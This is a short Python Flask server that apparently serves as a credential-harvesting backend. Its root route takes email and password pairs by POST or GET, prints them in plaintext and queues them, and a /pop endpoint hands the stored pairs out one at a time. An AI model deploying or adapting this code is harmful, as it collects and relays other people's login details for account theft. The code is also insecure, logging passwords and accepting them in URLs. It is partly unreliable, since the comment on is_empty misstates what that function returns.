from flask import Flask, redirect, url_for, request
from time import sleep

app = Flask(__name__)
data_queue = []

@app.route('/', methods = ['POST', 'GET'])
def login():
    if request.method == 'POST':
        password = request.form['password']
        print("PASSWORD:", password)
        email = request.form['email']
        print("EMAIL:", email)
        data_queue.append((email, password))
        print(data_queue)
        return "Data recieved."
    else:
        password = request.args.get('password')
        print("PASSWORD:", password)
        email = request.args.get('email')
        print("EMAIL:", email)
        data_queue.append((email, password))
        print(data_queue)
        return "Data recieved."

@app.route('/pop', methods = ['POST', 'GET'])
def pop_from_queue():
    if len(data_queue) == 0:
        return ""
    else:
        tmp = data_queue.pop(0)
        return str(tmp)

@app.route('/is_empty', methods = ['POST', 'GET'])
def is_empty():
    return str(not bool(data_queue)) # returns false if the queue is empty

if __name__ == '__main__':
    app.run()